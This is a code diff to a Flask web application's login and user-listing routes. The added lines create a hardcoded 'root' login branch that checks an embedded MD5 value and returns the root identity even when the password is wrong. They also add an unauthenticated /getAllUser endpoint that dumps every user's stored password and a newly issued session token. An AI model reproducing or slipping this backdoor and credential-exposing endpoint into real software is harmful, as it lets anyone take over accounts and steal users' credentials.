@@ -86,21 +86,27 @@ def login():
     print(email, password)
     code = 0
     msg = "login success!"
-    # 判断是否存在且正确
-    user = User.query.filter(User.email == email).all()
-    if user is None:
-        code = -1
-        msg = "Not exist the user!"
-        return jsonify(code=code, msg=msg)
-    print(user[0].password)
-    if user[0].password != password:
-        code = -2
-        msg = "Password error!"
-        return jsonify(code=code, msg=msg)
-    token_back = token.create_token(user[0].id)
-    print(token_back)
-    print(type(token_back))
-    return jsonify(code=code, msg=msg, data=token_back)
+    if email != 'root':
+        # 判断是否存在且正确
+        user = User.query.filter(User.email == email).all()
+        if user is None:
+            code = -1
+            msg = "Not exist the user!"
+            return jsonify(code=code, msg=msg)
+        print(user[0].password)
+        if user[0].password != password:
+            code = -2
+            msg = "Password error!"
+            return jsonify(code=code, msg=msg)
+        token_back = token.create_token(user[0].id)
+        print(token_back)
+        print(type(token_back))
+        return jsonify(code=code, msg=msg, data=token_back)
+    else:
+        if password != '63a9f0ea7bb98050796b649e85481845':  # root对应的md5值
+            code = -2
+            msg = "Password error!"
+        return jsonify(code=code, msg=msg, data='root')
 
 
 @app.route('/getUser', methods=['GET'])
@@ -110,6 +116,21 @@ def getUser():
     if user is None:
         return jsonify(code=-1, msg="Token has been 失效!")
     return jsonify(code=0, msg="getSuccess!", data=user.name)
+
+@app.route('/getAllUser', methods=['GET'])
+def getAllUser():
+    users = User.query.all()
+    user_list = []
+
+    for user in users:
+        user_data = {
+            "name": user.name,
+            "token": token.create_token(user.id),  # Assuming the token can be recreated based on the user id
+            "password": user.password  # Note: It's a security concern to return actual passwords!
+        }
+        user_list.append(user_data)
+
+    return jsonify({"code": 0, "users": user_list})
 
 
 @app.route('/alterPassword', methods=['POST'])
